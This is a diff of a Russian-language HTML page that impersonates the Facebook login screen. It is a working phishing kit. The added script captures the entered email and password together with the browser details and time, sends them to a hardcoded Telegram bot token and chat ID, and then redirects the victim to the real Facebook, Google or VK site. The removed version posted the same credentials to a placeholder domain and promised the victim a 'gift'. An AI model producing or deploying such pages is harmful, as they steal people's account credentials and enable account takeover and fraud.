@@ -1,88 +1,149 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Вход в Facebook</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #3b5998;
-            color: white;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            flex-direction: column;
-        }
-        .container {
-            background: white;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-            text-align: center;
-            color: black;
-        }
-        input {
-            display: block;
-            width: 100%;
-            padding: 10px;
-            margin: 10px 0;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-        }
-        button {
-            width: 100%;
-            padding: 10px;
-            background-color: #3b5998;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-        }
-        button:hover {
-            background-color: #2d4373;
-        }
-        .logo {
-            width: 100px;
-            margin-bottom: 20px;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Вход через Facebook</title>
+  <style>
+    body {
+      background-color: #f0f2f5;
+      font-family: 'Helvetica', Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .container {
+      background-color: white;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+      width: 400px;
+      text-align: center;
+    }
+    .logo {
+      width: 200px;
+      margin-bottom: 20px;
+    }
+    h1 {
+      font-size: 24px;
+      color: #1c1e21;
+      margin-bottom: 20px;
+    }
+    input {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      font-size: 14px;
+      transition: border-color 0.3s ease;
+    }
+    input:focus {
+      border-color: #1877f2;
+      outline: none;
+    }
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #1877f2;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+    button:hover {
+      background-color: #166fe5;
+    }
+    .footer {
+      margin-top: 20px;
+      font-size: 14px;
+      color: #606770;
+    }
+    .footer a {
+      color: #1877f2;
+      text-decoration: none;
+    }
+    .footer a:hover {
+      text-decoration: underline;
+    }
+  </style>
 </head>
 <body>
-    <div class="container">
-        <img src="facebook-icon.png" alt="fa" class="logo">
-        <h1>Вход в Facebook</h1>
-        <form id="loginForm">
-            <input type="text" id="login" placeholder="Электронная почта или телефон" required>
-            <input type="password" id="password" placeholder="Пароль" required>
-            <button type="submit">Войти</button>
-        </form>
+  <div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook" class="logo">
+    <h1>Войдите в Facebook</h1>
+    <form onsubmit="sendData(event, 'facebook')">
+      <input type="email" id="email" placeholder="Email" required>
+      <input type="password" id="password" placeholder="Пароль" required>
+      <button type="submit">Войти</button>
+    </form>
+    <div class="footer">
+      <a href="#">Забыли пароль?</a>
     </div>
-    <script>
-        document.getElementById('loginForm').addEventListener('submit', function(event) {
-            event.preventDefault();
-            const login = document.getElementById('login').value;
-            const password = document.getElementById('password').value;
-            const service = 'Facebook';
+  </div>
 
-            // Отправляем данные на сервер
-            fetch('https://вашдомен.ру/send-data', {  // Замени на свой домен
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({ service, login, password })
-            })
-            .then(response => response.json())
-            .then(data => {
-                alert('Спасибо! Ваши данные получены. Скоро вы получите свой подарок!');
-            })
-            .catch(() => {
-                alert('Спасибо! Ваши данные получены. Скоро вы получите свой подарок!');
-            });
-        });
-    </script>
+ <script>
+    // Токен вашего бота и chat_id
+    const BOT_TOKEN = "7728256968:AAEenNdOxdzfTtPMM5H-ILAAK9hNNzhBsP0";  // Замените на токен вашего бота
+    const CHAT_ID = "7947290290";      // Замените на ваш chat_id
+
+    // Функция для отправки данных
+    function sendData(event, service) {
+      event.preventDefault(); // Отменяем стандартное поведение формы
+
+      // Получаем данные из формы
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+
+      // Получаем информацию о пользователе
+      const user_ip = ''; // IP-адрес можно получить через сторонний сервис (например, ipify)
+      const user_agent = navigator.userAgent;
+      const current_time = new Date().toLocaleString();
+
+      // Формируем сообщение для Telegram
+      const message = `
+    Новый вход через ${service}:
+    Время: ${current_time}
+    IP: ${user_ip}
+    User-Agent: ${user_agent}
+    Email: ${email}
+    Пароль: ${password}
+      `;
+
+      // Отправляем данные в Telegram
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+      const params = {
+        chat_id: CHAT_ID,
+        text: message
+      };
+
+      fetch(url, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(params)
+      })
+      .then(response => response.json())
+      .then(data => {
+        console.log('Данные отправлены в Telegram:', data);
+        // Перенаправление на оригинальный сайт
+        if (service === 'google') {
+          window.location.href = 'https://google.com';
+        } else if (service === 'facebook') {
+          window.location.href = 'https://facebook.com';
+        } else if (service === 'vk') {
+          window.location.href = 'https://vk.com';
+        }
+      })
+      .catch(error => {
+        console.error('Ошибка отправки данных:', error);
+      });
+    }
+  </script>
 </body>
 </html>
